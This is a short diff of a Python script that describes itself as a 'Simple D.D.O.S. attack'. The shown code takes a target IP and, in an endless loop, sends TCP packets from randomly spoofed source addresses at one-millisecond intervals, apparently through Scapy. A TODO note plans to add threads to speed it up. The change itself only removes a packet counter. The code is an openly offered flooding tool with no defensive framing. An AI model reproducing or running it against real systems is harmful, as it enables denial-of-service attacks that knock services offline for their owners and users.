@@ -7,8 +7,6 @@ parser = argparse.ArgumentParser(description="Simple D.D.O.S. attack")  #Distrib
 parser.add_argument("-t", "--target", dest="target", help="Target IP", required=True)
 arguments = parser.parse_args()
 
-packages = 1
-
 def randomIP():
     part1 = str(randint(1,254))
     part2 = str(randint(1,254))
@@ -23,6 +21,5 @@ while True:
     package = IP1 / TCP1
     send(package, inter=0.001, verbose=False)   #inter: time interval to wait between two packages
     print("Ip: %s  -----------  Port: %i" %(IP1.src, TCP1.sport))
-    packages += 1
 
 #TODO: optimize with threads
